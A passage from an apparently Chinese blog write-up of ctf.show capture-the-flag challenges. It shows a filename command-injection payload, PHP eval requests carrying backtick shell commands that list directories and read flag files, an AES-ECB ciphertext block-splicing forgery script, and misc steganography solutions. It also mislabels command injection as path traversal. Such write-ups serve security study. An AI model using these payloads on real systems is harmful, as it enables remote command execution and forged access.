class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>首先可以得到<code>flag is in /app/flag.py</code>, 然后发现<code>cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</code>没有过滤,没有限制,可能会出现和命令注入攻击</p><blockquote><p>如果用户上传的文件名包含恶意的路径信息(例如 …/…/etc/passwd), 那么这个代码就会尝试在一个用户不应该有权限访问的路径下运行 <a href="http://tsteg.py">tsteg.py</a> 脚本. 这就是所谓的路径遍历攻击, 攻击者通过这种方式可以访问到他们本不应该能够访问的文件.</p><p>如果 f.filename 中包含了特殊字符(如分号或反引号), 那么攻击者可能可以在 <a href="http://tsteg.py">tsteg.py</a> 脚本执行完之后, 再执行一些恶意的命令, 这就是所谓的路径遍历攻击</p></blockquote><p>所以只需要在上传文件的地方加上分号再续上命令就好了, poc如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.jpg;ls;cat flag.py</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240627183205759.png" alt="image-20240627183205759"></p><h2 id="Is-Not-Obfuscate"><a class="header-anchor" href="#Is-Not-Obfuscate">¶</a>Is_Not_Obfuscate</h2><p>你可以在源码里面找到一些提示:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- //测试执行加密后的插件代码 </span></span><br><span class="line"><span class="comment">   //这里只能执行加密代码，非加密代码不能执行</span></span><br><span class="line"><span class="comment">  eval(decode($_GET[&#x27;input&#x27;])); --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &lt;button name=&quot;action&quot; value=&quot;test&quot;&gt; 执行 (do)&lt;/button&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Test the lib.php before use the index.php！--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- After that,delete the robots.txt！--&gt;</span></span><br></pre></td></tr></table></figure><p>访问robots.txt可以得到两个敏感路径:<code>/lib.php?flag=0</code>和<code>/plugins</code>; 访问<code>/lib.php?flag=1</code>可以得到一串类似base64的密文, 将这行密文复制到输入框; 另外上面注释不是注释掉了一个按钮嘛, 你给他变回来, 操作如下:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240627190324419.png" alt="image-20240627190324419"></p><p>可以得到解密后的源码:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./plugins/&#x27;</span>))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;./plugins/&#x27;</span>, <span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Test it and delete it ！！！</span></span><br><span class="line"><span class="comment">//测试执行加密后的插件代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Anything is good?Please test it.&#x27;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;./plugins/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;pull&#x27;</span>:</span><br><span class="line">            <span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;pull success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;push success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过审阅源码可知, action的值有三个: test, pull, push</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test：测试用</span><br><span class="line">push：插件内容写入文件</span><br><span class="line">pull：读取文件，解密命令并执行</span><br></pre></td></tr></table></figure><p>由于<code>md5($_GET['output'].'youyou'</code>,说明加密的盐值为youyou</p><p>假如我们传入<code>output=phpinfo()&amp;action=push</code>, 则会生成一个文件, 路径为<code>plugins/md5值</code>该md5值是可以本地计算得到的, 就是我们代码后面拼接youyou后的md5值;然后如果在传入<code>action=pull&amp;input=刚才生成的文件路径</code>就可以运行刚才的代码了。</p><p>因此，构造读取目录的Payload如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 加密, 你问我变量怎么来的?抓包来的</span><br><span class="line">?input=&amp;action=push&amp;output=&lt;?php echo `ls /`;?&gt;</span><br><span class="line"># 解密和执行</span><br><span class="line">?input=e31d7b1dfe43749c42490c26deca67a6&amp;action=pull&amp;output=</span><br></pre></td></tr></table></figure><p>执行就可以得到文件目录,继续构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># payload</span><br><span class="line">?input=&amp;action=push&amp;output=&lt;?php echo `cat /f1agaaa`;?&gt;</span><br><span class="line">?input=aa47b964e675ae576fa5a3a266afb74f&amp;action=pull&amp;output=</span><br></pre></td></tr></table></figure><h2 id="龙珠NFT"><a class="header-anchor" href="#龙珠NFT">¶</a>龙珠NFT</h2><p>源码如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：DragonBall Radar (BlockChain)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#网上找的AES加密代码，加密我又不懂，加就完事儿了</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,key</span>):</span><br><span class="line">        self.key = self.add_16(hashlib.md5(key.encode()).hexdigest()[:<span class="number">16</span>])</span><br><span class="line">        self.model = AES.MODE_ECB</span><br><span class="line">        self.aes = AES.new(self.key,self.model)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_16</span>(<span class="params">self,par</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(par) == <span class="built_in">str</span>:</span><br><span class="line">            par = par.encode()</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(par) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">            par += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> par</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">aesencrypt</span>(<span class="params">self,text</span>):</span><br><span class="line">        text = self.add_16(text)</span><br><span class="line">        self.encrypt_text = self.aes.encrypt(text)</span><br><span class="line">        <span class="keyword">return</span> self.encrypt_text</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">aesdecrypt</span>(<span class="params">self,text</span>):</span><br><span class="line">        self.decrypt_text = self.aes.decrypt(text)</span><br><span class="line">        self.decrypt_text = self.decrypt_text.strip(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.decrypt_text</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag=os.getenv(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line">AES_ECB=AESCipher(flag)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"><span class="comment">#懒得弄数据库或者类，直接弄字典就完事儿了</span></span><br><span class="line">players=&#123;&#125;</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    提供登录功能</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/radar&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">radar</span>():</span><br><span class="line">   <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">   提供雷达界面</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/find_dragonball&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">find_dragonball</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    找龙珠，返回龙珠地址</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    xxxxxxxxxxx<span class="comment">#无用代码可以忽略</span></span><br><span class="line">    <span class="keyword">if</span> search_count==<span class="number">10</span>:<span class="comment">#第一次搜寻，给一个一星龙珠</span></span><br><span class="line">        dragonball=<span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> search_count&lt;=<span class="number">0</span>:</span><br><span class="line">        data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;搜寻次数已用完&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">return</span> jsonify(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        random_num=random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> random_num&lt;=<span class="number">6</span>:</span><br><span class="line">            dragonball=一个没拿过的球，比如<span class="string">&#x27;6&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dragonball=<span class="string">&#x27;0&#x27;</span><span class="comment">#0就代表没有发现龙珠</span></span><br><span class="line">    players[player_id][<span class="string">&#x27;search_count&#x27;</span>]=search_count-<span class="number">1</span></span><br><span class="line">    data=&#123;<span class="string">&#x27;player_id&#x27;</span>:player_id,<span class="string">&#x27;dragonball&#x27;</span>:dragonball,<span class="string">&#x27;round_no&#x27;</span>:<span class="built_in">str</span>(<span class="number">11</span>-search_count),<span class="string">&#x27;time&#x27;</span>:time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)&#125;</span><br><span class="line">    <span class="comment">#json.dumps(data)=&#x27;&#123;&quot;player_id&quot;: &quot;572d4e421e5e6b9bc11d815e8a027112&quot;, &quot;dragonball&quot;: &quot;1&quot;, &quot;round_no&quot;: &quot;9&quot;, &quot;time&quot;:&quot;2022-10-19 15:06:45&quot;&#125;&#x27;</span></span><br><span class="line">    data[<span class="string">&#x27;address&#x27;</span>]= base64.b64encode(AES_ECB.aesencrypt(json.dumps(data))).decode()</span><br><span class="line">    <span class="keyword">return</span> jsonify(data)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_dragonball&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dragonball</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据龙珠地址解密后添加到用户信息</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    xxxxxxxxx<span class="comment">#无用代码可以忽略</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        player_id=request.cookies.get(<span class="string">&quot;player_id&quot;</span>)</span><br><span class="line">        address=request.args.get(<span class="string">&#x27;address&#x27;</span>)</span><br><span class="line">        data=AES_ECB.aesdecrypt(base64.b64decode(address))</span><br><span class="line">        data=json.loads(data.decode())</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;dragonball&#x27;</span>] !=<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            players[data[<span class="string">&#x27;player_id&#x27;</span>]][<span class="string">&#x27;dragonballs&#x27;</span>].append(data[<span class="string">&#x27;dragonball&#x27;</span>])</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;get_ball&#x27;</span>:data[<span class="string">&#x27;dragonball&#x27;</span>]&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>:<span class="string">&quot;这个地址没有发现龙珠&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;msg&#x27;</span>:<span class="string">&quot;你干啥???????&quot;</span>&#125;)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    查看龙珠库存</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#如果有7颗龙珠就拿到flag~</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_source</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    查看源代码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>根据源码可知, 一共有5个路由:</p><ol><li><code>/</code>提供注册功能, 将用户名的md5作为session存入</li><li><code>/radar</code>没用</li><li><code>/find_dragonball</code>如果是第一次访问, 那么dragonball就是固定值1, 否则访问后产生一个随机数范围是1-1000; 如果是在0-6之间, 那么就把dragonball赋值为该数，否则就赋值为0; 并且每个用户都是只有十次机会</li><li><code>get_dragonball</code>传入一个address，如果解密后的值中dragonball不为0，那么就会获得该星的龙珠</li><li><code>flag</code>有1-7号的dragonball就拿到flag</li></ol><p>即使你想用暴力破解的方式, 问题是代码限制永远不可能获得数字7, 唯一可能有问题的地方就是加密方法了, 利用加密方法伪造地址获得龙珠</p><p>address是用AES的ECB模式加密的，稍微查一下就可以知道，ECB模式一组密文对应一组明文，也就是说，可以通过改变密文的顺序从而改变解密后明文的顺序; 代码中用的是以16位为一组进行分割,不足16位则用\x00补齐</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/925d2af71d650be1ff09e9b5e22fcfae.png" alt="image-20230901113556970"></p><p>利用源码中给的例子进行划分: 用户不变的前提下,前四行是固定的; 如果我们删除第五行, 刚好<code>dragonball</code>就会变成<code>round_no</code>的9, 而只要<code>dragonball</code>不为0我们就能获得龙珠; 这个次数又是我们可以控制的, 也就可以控制生成的龙珠数了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;player_id&quot;: &quot;5</span><br><span class="line">72d4e421e5e6b9bc</span><br><span class="line">11d815e8a027112&quot;</span><br><span class="line">, &quot;dragonball&quot;: </span><br><span class="line">&quot;1&quot;, &quot;round_no&quot;:# 到时候这行没了</span><br><span class="line"> &quot;9&quot;, &quot;time&quot;:&quot;2</span><br><span class="line"> 022-10-19 15:06</span><br><span class="line"> :45&quot;&#125;</span><br></pre></td></tr></table></figure><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://37f2b8fd-efbc-45e6-b33b-9eb1392146c7.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">username = <span class="built_in">str</span>(random.randint(<span class="number">1</span>, <span class="number">100000</span>))</span><br><span class="line"><span class="built_in">print</span>(username)</span><br><span class="line">r = s.get(url + <span class="string">&#x27;?username=&#x27;</span> + username)  <span class="comment"># 创建随机用户名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环10次向服务器发送请求以获取龙珠信息, 将响应解析后存储在 responses 列表</span></span><br><span class="line">responses = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r = s.get(url + <span class="string">&#x27;find_dragonball&#x27;</span>)</span><br><span class="line">    responses.append(json.loads(r.text))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码遍历列表, 提取出 player_id, dragonball, round_no 和 time, 并将 address 进行Base64解码。然后检查 round_no</span></span><br><span class="line"><span class="comment"># 是否在1到7之间，如果是，则通过删除解码后的地址中的某些部分伪造一个新的地址 fake_address, 并重新编码; 最后, 使用伪造的地址向服务器发送请求以获取龙珠</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> responses:</span><br><span class="line">    data = json.dumps(&#123;<span class="string">&#x27;player_id&#x27;</span>: item[<span class="string">&#x27;player_id&#x27;</span>], <span class="string">&#x27;dragonball&#x27;</span>: item[<span class="string">&#x27;dragonball&#x27;</span>], <span class="string">&#x27;round_no&#x27;</span>: item[<span class="string">&#x27;round_no&#x27;</span>],</span><br><span class="line">                       <span class="string">&#x27;time&#x27;</span>: item[<span class="string">&#x27;time&#x27;</span>]&#125;)</span><br><span class="line">    miwen = base64.b64decode(item[<span class="string">&#x27;address&#x27;</span>])</span><br><span class="line">    round_no = item[<span class="string">&#x27;round_no&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> round_no <span class="keyword">in</span> [<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>)]:</span><br><span class="line">        fake_address = miwen[:<span class="number">64</span>] + miwen[<span class="number">80</span>:]</span><br><span class="line">        fake_address = base64.b64encode(fake_address).decode()</span><br><span class="line">        r = s.get(url + <span class="string">&#x27;get_dragonball&#x27;</span>, params=&#123;<span class="string">&quot;address&quot;</span>: fake_address&#125;)</span><br><span class="line"></span><br><span class="line">r = s.get(url + <span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>Misc</h1><hr><h2 id="谜之栅栏"><a class="header-anchor" href="#谜之栅栏">¶</a>谜之栅栏</h2><p>下载下来两个文件都无法用stegdetect打开, 但是用图片打开还是有不同的,于是就想在16进制里面找</p><p>用010 Editor的比较文件(Ctrl+M)工具可以寻找两个文件中的不同之处然后拼接<code>cfhwfaab2cb4af5a5820&#125;</code>和<code>tso&#123;06071f997b5bdd1a</code>既然叫做栅栏,就试试栅栏密码解密, 分为两栏的时候得到解密结果</p><h2 id="你会数数吗"><a class="header-anchor" href="#你会数数吗">¶</a>你会数数吗</h2><p>用010 Editor打开此文件,数数多半意味着字数统计</p><p>找到直方图(Ctrl+Shift+T), 然后按照百分比排序就可以看到flag</p><h2 id="你会异或吗"><a class="header-anchor" href="#你会异或吗">¶</a>你会异或吗</h2><p>题目给了数字0x50, 因为异或可逆的特性, 只需要再次异或就可以变回来</p><p>用010 Editor打开此文件, 文件内没有有效字符串也没有其他东西, 猜测是将整个文件异或</p><p>工具-&gt; 十六进制运算-&gt; 二进制异或-&gt; 操作数50(十六进制), 就可以看到是正常的PNG头, 保存修改拿到flag</p><h2 id="flag一分为二"><a class="header-anchor" href="#flag一分为二">¶</a>flag一分为二</h2><p>尝试了图片宽高爆破, 在图片底下得到后半部分flag</p><blockquote><p>被修改过的图片 Honeyview 都不能正常显示</p></blockquote><p>LSB没有, 不包含压缩包, 然后尝试盲水印, 可以得到前半部分flag</p><p><a href="https://www.mefcl.com/watermark/5821">watermark</a></p><h2 id="我是谁"><a class="header-anchor" href="#我是谁">¶</a>我是谁?</h2><p>不会写脚本就是一个纯纯费眼睛的玩意, 很难想象出题人经历了什么有如此的精神状态</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;https://be63e113-bfc8-4d2f-85a8-ff939464fa05.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">sess=requests.session()</span><br><span class="line"></span><br><span class="line">all_girl=sess.get(url+<span class="string">&#x27;/static/all_girl.png&#x27;</span>).content</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;all_girl.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        f.write(all_girl)</span><br><span class="line"></span><br><span class="line">big_pic=cv2.imdecode(np.fromfile(<span class="string">&#x27;all_girl.png&#x27;</span>, dtype=np.uint8), cv2.IMREAD_UNCHANGED)</span><br><span class="line">big_pic=big_pic[<span class="number">50</span>:,<span class="number">50</span>:,:]</span><br><span class="line">image_alpha = big_pic[:, :, <span class="number">3</span>]</span><br><span class="line">mask_img=np.zeros((big_pic.shape[<span class="number">0</span>],big_pic.shape[<span class="number">1</span>]), np.uint8)</span><br><span class="line">mask_img[np.where(image_alpha == <span class="number">0</span>)] = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;big.png&#x27;</span>,mask_img)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">answer_one</span>(<span class="params">sess</span>):</span><br><span class="line">        <span class="comment">#获取视频文件</span></span><br><span class="line">        response=sess.get(url+<span class="string">&#x27;/check&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(response.text)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">        tree=html.fromstring(response.text)</span><br><span class="line">        element=tree.xpath(<span class="string">&#x27;//source[@id=&quot;vsource&quot;]&#x27;</span>)</span><br><span class="line">        video_path=element[<span class="number">0</span>].get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">        video_bin=sess.get(url+video_path).content</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Question.mp4&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">                f.write(video_bin)</span><br><span class="line">        <span class="comment">#获取有效帧</span></span><br><span class="line">        video = cv2.VideoCapture(<span class="string">&#x27;Question.mp4&#x27;</span>)</span><br><span class="line">        frame=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> frame&lt;=<span class="number">55</span>:</span><br><span class="line">                res, image = video.read()</span><br><span class="line">                frame+=<span class="number">1</span></span><br><span class="line">        <span class="comment">#cv2.imwrite(&#x27;temp.png&#x27;,image)</span></span><br><span class="line">        video.release()</span><br><span class="line">        <span class="comment">#获取剪影</span></span><br><span class="line">        image=image[<span class="number">100</span>:<span class="number">400</span>,<span class="number">250</span>:<span class="number">500</span>]</span><br><span class="line">        gray_image=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)</span><br><span class="line">        <span class="comment">#cv2.imwrite(&#x27;gray_image.png&#x27;,gray_image)</span></span><br><span class="line">        temp = np.zeros((<span class="number">300</span>, <span class="number">250</span>), np.uint8)</span><br><span class="line">        temp[np.where(gray_image&gt;=<span class="number">128</span>)]=<span class="number">255</span></span><br><span class="line">        <span class="comment">#去白边</span></span><br><span class="line">        temp = temp[[<span class="keyword">not</span> np.<span class="built_in">all</span>(temp[i] == <span class="number">255</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(temp.shape[<span class="number">0</span>])], :]</span><br><span class="line">        temp = temp[:, [<span class="keyword">not</span> np.<span class="built_in">all</span>(temp[:, i] == <span class="number">255</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(temp.shape[<span class="number">1</span>])]]</span><br><span class="line">        <span class="comment">#缩放至合适大小，肉眼大致判断是1.2倍，不一定准</span></span><br><span class="line">        temp = cv2.resize(temp,<span class="literal">None</span>,fx=<span class="number">1.2</span>,fy=<span class="number">1.2</span>)</span><br><span class="line">        <span class="comment">#查找位置</span></span><br><span class="line">        res =cv2.matchTemplate( mask_img,temp,cv2.TM_CCOEFF_NORMED)</span><br><span class="line">        min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)</span><br><span class="line">        x,y=<span class="built_in">int</span>(max_loc[<span class="number">0</span>]/<span class="number">192</span>),<span class="built_in">int</span>(max_loc[<span class="number">1</span>]/<span class="number">288</span>)<span class="comment">#为什么是192和288，因为大图去掉标题栏就是1920*2880</span></span><br><span class="line">        guess=<span class="string">&#x27;ABCDEFGHIJ&#x27;</span>[y]+<span class="string">&#x27;0123456789&#x27;</span>[x]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;guess:<span class="subst">&#123;guess&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment">#传答案</span></span><br><span class="line">        response=sess.get(url+<span class="string">&#x27;/submit?guess=&#x27;</span>+guess)</span><br><span class="line">        r=json.loads(response.text)</span><br><span class="line">        <span class="keyword">if</span> r[<span class="string">&#x27;result&#x27;</span>]:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;guess right!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;guess wrong!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">31</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Round:<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> 